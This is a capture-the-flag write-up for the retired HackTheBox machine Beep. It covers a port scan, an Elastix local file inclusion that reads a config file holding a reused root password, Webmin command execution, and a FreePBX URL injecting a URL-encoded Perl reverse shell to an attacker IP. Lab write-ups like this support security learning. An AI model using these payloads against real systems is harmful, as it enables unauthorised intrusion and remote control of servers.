---
title: "Beep - HackTheBox"
description: "Writeup for Beep, a Linux machine with multiple attack vectors through Elastix."
pubDate: 2024-10-11
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
lang: en
tags: ["elastix", "lfi", "webmin"]
retired: true
logo: "/images/writeups/htb/beep/logo.png"
heroImage: "/images/writeups/htb/beep/cover.png"
---

# Beep - HackTheBox Writeup

**Difficulty**: Easy  
**OS**: Linux  
**Platform**: HackTheBox

## Reconnaissance

```bash
nmap -sC -sV -p- 10.10.10.7
```

**Interesting ports:**
- 22/tcp (SSH)
- 80/tcp (HTTP - Apache)
- 443/tcp (HTTPS - Apache)
- 10000/tcp (Webmin)

## Web Enumeration

When accessing HTTPS we find **Elastix** - a PBX system based on Asterisk.

### Elastix LFI

Elastix has a Local File Inclusion (LFI) vulnerability:

```
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

In the `amportal.conf` file we find credentials:
- User: `admin`
- Password: `jEhdIekWmdjE`

## Exploitation

### Method 1: SSH

The credentials work for SSH as root user:

```bash
ssh root@10.10.10.7
Password: jEhdIekWmdjE
```

### Method 2: Webmin

We can also use the credentials in Webmin (port 10000) and execute commands:

```bash
# In Webmin Command Shell
cat /root/root.txt
```

### Method 3: FreePBX Exploit

```bash
# Reverse shell through extension
https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=1337@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.5%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```

## Flags

**User flag:**
```bash
cat /home/fanis/user.txt
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusion

Beep demonstrates that a single vulnerability (LFI) can compromise the entire system when it exposes credentials. It also shows the importance of:

- Credential segregation
- Principle of least privilege
- Software updates
- Secure file configuration
